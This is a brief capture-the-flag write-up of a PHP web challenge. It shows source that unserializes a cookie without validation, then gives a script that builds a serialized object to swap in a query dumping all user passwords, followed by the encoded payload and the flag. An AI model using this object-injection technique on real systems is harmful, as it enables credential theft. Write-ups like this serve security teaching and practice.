In index.php, its just given 'cant hack us!!'. When we curl this website, we can see that the source is in source1.php and source2.php.
In source1.php we can see that, the cookie is serialized without any validation. 
```
<?php
include 'connect.php';

$sql = new SQL();
$sql->connect();
$sql->query = 'SELECT username FROM users WHERE id=';


if (isset ($_COOKIE['leet_hax0r'])) {
    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));
    try {
        if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
            die('CANT HACK US!!!');
        }
    } catch(Exception $e) {
        echo $e;
    }
} else {
    $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
    setcookie ('leet_hax0r', $cookie, time () + (86400 * 30));
}

if (isset ($_REQUEST['id']) && is_numeric ($_REQUEST['id'])) {
    try {
        $sql->query .= $_REQUEST['id'];
    } catch(Exception $e) {
        echo ' Invalid query';
    }
}
?>
```
So, we need to write a script to get a serialised payload.
```
<?php

class sql
{
    public $query;
    public $conn;

    function __construct()
    {
        $this->query='SELECT group_concat(password) as username from users;';
        $this->conn=NULL;

    }

}
$new=new sql();
echo urlencode(base64_encode(serialize($new)));
```
We got the payload as :TzozOiJzcWwiOjI6e3M6NToicXVlcnkiO3M6NTM6IlNFTEVDVCBncm91cF9jb25jYXQocGFzc3dvcmQpIGFzIHVzZXJuYW1lIGZyb20gdXNlcnM7IjtzOjQ6ImNvbm4iO047fQ%3D%3D

Give this value in the leet_hax0r cookie and we get the flag
flag:  WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}

